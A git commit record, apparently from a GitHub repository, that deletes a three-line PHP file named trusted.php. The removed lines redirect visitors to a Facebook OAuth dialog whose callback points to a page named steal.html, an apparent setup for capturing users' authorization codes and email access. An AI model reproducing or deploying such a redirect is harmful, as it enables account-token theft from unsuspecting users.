86ba98b0db60679dc7a6cefcc4cfef3acb065e80
Bagas Rizki Gunardi <42662942+w1th0ut@users.noreply.github.com>
2021-07-09 15:19:16 +0700

    Delete trusted.php

--- trusted.php
+++
@@ -1,3 +0,0 @@
-<?php
-header("Location:https://www.facebook.com/dialog/oauth?client_id=812704828818153&redirect_uri=https%3A%2F%2Fw1th0ut.github.io%2Fsteal.html&response_type=code&scope=email&display=popup");
-?>
